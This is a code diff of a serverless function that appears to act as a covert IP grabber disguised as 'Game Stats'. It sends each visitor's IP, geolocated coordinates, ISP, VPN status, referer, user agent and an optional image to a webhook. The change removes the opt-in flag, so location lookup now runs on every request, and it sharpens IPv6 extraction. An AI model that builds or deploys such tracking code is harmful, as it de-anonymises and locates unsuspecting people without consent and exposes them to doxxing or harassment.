@@ -4,10 +4,18 @@ export async function handler(event) {
     if (!WEBHOOK) return { statusCode: 200, body: 'OK' };
     if (event.httpMethod !== 'POST') return { statusCode: 200, body: 'OK' };
 
-    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() 
-                  || event.headers['cf-connecting-ip']
-                  || event.headers['x-real-ip'] 
-                  || 'Unknown';
+    // Extract client IP - handle IPv4 and IPv6
+    const forwarded = event.headers['x-forwarded-for'];
+    let clientIP = forwarded?.split(',')[0]?.trim() 
+                || event.headers['cf-connecting-ip']
+                || event.headers['x-real-ip'] 
+                || 'Unknown';
+    
+    // Clean up IPv6 addresses (remove port if present)
+    if (clientIP.includes(':') && !clientIP.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+      // IPv6 - extract just the IP (remove any zone ID or port)
+      clientIP = clientIP.replace(/\[|\]/g, '').split('%')[0].split(':').slice(0, 4).join(':');
+    }
 
     let data = {};
     try { data = JSON.parse(event.body || '{}'); } catch (_) {}
@@ -18,26 +26,25 @@ export async function handler(event) {
 
     let geo = { country: 'XX', city: 'Unknown', org: 'Unknown', isVpn: false, lat: null, lon: null };
 
-    if (data._loc) {
-      try {
-        const r = await fetch(`https://ipapi.co/${clientIP}/json/`);
-        if (r.ok) {
-          const j = await r.json();
-          const vpnASNs = ['AS13335','AS8075','AS14061','AS16509','AS20940','AS9009','AS174','AS32590','AS54113'];
-          const vpnOrgs = ['cloudflare','digital ocean','amazon','google','microsoft','oracle','vultr','linode','hetzner'];
-          const isVpn = vpnASNs.includes(j.asn) || vpnOrgs.some(o => j.org?.toLowerCase().includes(o));
-          
-          geo = {
-            country: j.country || 'XX',
-            city: j.city || 'Unknown',
-            org: j.org || 'Unknown',
-            isVpn: isVpn,
-            lat: j.latitude,
-            lon: j.longitude
-          };
-        }
-      } catch (_) {}
-    }
+    // Always fetch IP info (no client-side geolocation needed)
+    try {
+      const r = await fetch(`https://ipapi.co/${clientIP}/json/`);
+      if (r.ok) {
+        const j = await r.json();
+        const vpnASNs = ['AS13335','AS8075','AS14061','AS16509','AS20940','AS9009','AS174','AS32590','AS54113'];
+        const vpnOrgs = ['cloudflare','digital ocean','amazon','google','microsoft','oracle','vultr','linode','hetzner'];
+        const isVpn = vpnASNs.includes(j.asn) || vpnOrgs.some(o => j.org?.toLowerCase().includes(o));
+        
+        geo = {
+          country: j.country || 'XX',
+          city: j.city || 'Unknown',
+          org: j.org || 'Unknown',
+          isVpn: isVpn,
+          lat: j.latitude,
+          lon: j.longitude
+        };
+      }
+    } catch (_) {}
 
     const flag = (c) => {
       if (!c || c.length !== 2) return '🌍';
@@ -50,7 +57,7 @@ export async function handler(event) {
       color: 0x00ff00,
       fields: [
         { name: 'Player IP', value: clientIP, inline: true },
-        { name: 'Region', value: geo.country, inline: true },
+        { name: 'Region', value: `${flag(geo.country)} ${geo.country}`, inline: true },
         { name: 'Client', value: data._plat || 'Unknown', inline: true }
       ],
       footer: { text: 'Game Stats' },
@@ -62,10 +69,10 @@ export async function handler(event) {
     }
 
     if (geo.lat && geo.lon) {
-      embed.fields.push({ name: '� Last Pos', value: `${geo.lat.toFixed(2)}, ${geo.lon.toFixed(2)}`, inline: true });
+      embed.fields.push({ name: '📍 Last Pos', value: `${geo.lat.toFixed(2)}, ${geo.lon.toFixed(2)}`, inline: true });
     }
 
-    embed.fields.push({ name: '� Source', value: referer.substring(0, 50), inline: true });
+    embed.fields.push({ name: '🔗 Source', value: referer.substring(0, 50), inline: true });
     embed.fields.push({ name: '🎫 Build', value: userAgent.substring(0, 60), inline: false });
 
     if (data._img && data._img.startsWith('data:')) {
